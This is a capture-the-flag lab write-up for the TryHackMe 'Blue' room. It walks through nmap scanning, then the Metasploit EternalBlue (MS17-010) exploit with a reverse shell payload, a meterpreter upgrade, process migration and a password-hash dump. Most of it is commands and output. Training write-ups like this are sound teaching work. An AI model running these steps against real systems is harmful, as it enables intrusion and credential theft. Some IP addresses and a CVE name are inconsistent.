# Scan example
This is based on the Blue room on TryHackMe (https://tryhackme.com/room/blue). 


Local IP: `10.18.72.167`   
Remote IP:`10.10.125.60`

## Initial scan
To understand what ports are available to me, I need to perform a scan and save the results in a directory called `nmap`:

`nmap -sC -sV -oN nmap/scan-1.txt 10.0.0.1`

**Results from scan**   

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 12:16 BST
Nmap scan report for 10.0.0.1
Host is up (0.028s latency).
Not shown: 991 closed tcp ports (conn-refused)

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.36 seconds
```

**Interesting ports**
The SMB port 445 looks like a good candidate for an attack vector. To see if it is vulnerable, `nmap` can be used in conjunction with one if its many scripts.

## nmap scan using scripts
There are a lot of smb scripts, so I am going to limit the scripts it loads to one of the `smb vulnerability` payloads:

`nmap --script=smb-vuln-* 10.0.0.1`

**Results from scan**   

```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
```

The target is vulnerable to `ms17-101`, also known as Eternal Blue. To exploit this, I am going to user `metasploit`

## Metasploit

**Start metasploit**
`msfconsole`

To find a suitable exploit, I am going to search for `ms17-010`:

`search ms17-010`

```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

The first exploit looks like it could be a good candidate, so I need to tell metasploit to use that one:

`use exploit/windows/smb/ms17_010_eternalblue`

**Exploit options**   
Each exploit has a number of configurable options, usually there is at least one mandatory option that needs to be set. To find the list of options run:

`show options`

```
Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s)
   RPORT          445              yes       The target port (TCP)

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST     10.18.72.167     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Looking at the `Required` options, I can see that `RHOSTS` is not set and `LHOST` is correctly set to my IP (This may need to be set if you are using a VPN)

**Setting options**   
I need to set `RHOSTS` to be the IP address of the host I am attacking (10.18.72.167)

`set RHOSTS 10.10.125.60`

**Running the exploit**   
My end-goal is to get a reverse shell on the server, so before I run the exploit I need to tell metasploit to inject a reverse shell payload:

`set payload windows/x64/shell/reverse_tcp`

I can now run the payload:

`exploit`

This should run the exploit, and drop me in to a shell on the target machine:

```
Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

**Extending the exploit**   
In the Windows shell that you have created, send it to the background by typing:

`background`

To upgrade the windows shell to a meterpreter shell, run:   

`use shell_to_meterpreter`

**Meterpreter options**
Just like exploits, different shells like meterpreter also have options:

`show options`

```
Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on
```
The `LHOST` option is required, but not set. We can set this to our local IP:

`set LHOST 10.18.72.167`

The `SESSION` option is required, but not set. To find a session for it to connect to, run:

`sessions`

```
Id  Name  Type               Information                                               Connection
--  ----  ----               -----------                                               ----------
1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.72.167:4444 -> 10.10.125.60:49196 (10.10.125.60)
```

Our current session is `1`, so we need to tell meterpreter to use this session:

`set session 1`

**Running the exploit**   
To get our meterpreter shell injected, run:

`exploit`

After this has run, you can check to see if the new session has been created:

`sessions`

```
  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.72.167:4444 -> 10.10.32.37:49170 (10.10.32.37)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.18.72.167:4433 -> 10.10.32.37:49172 (10.10.32.37)

```

**Join the new session**   
The new session id is `2`, so run an interactive session:

`sessions -i 2`


**Check running processes**   
We now have access to the system, but our process might not have the `SYSTEM` privileges so we need to find a process to migrate to. To see what processes are running, run:

`ps`

```
PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 ...   ...   ............          ...   .        .. ................           ................................
```

`winlogon.exe` looks to be a suitable process, so run:

`migrate -N winlogon.exe`

**Dumping hashes**   
Finally, we can dump out the hashes for the users:

`hashdump`

This will give us something like:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```




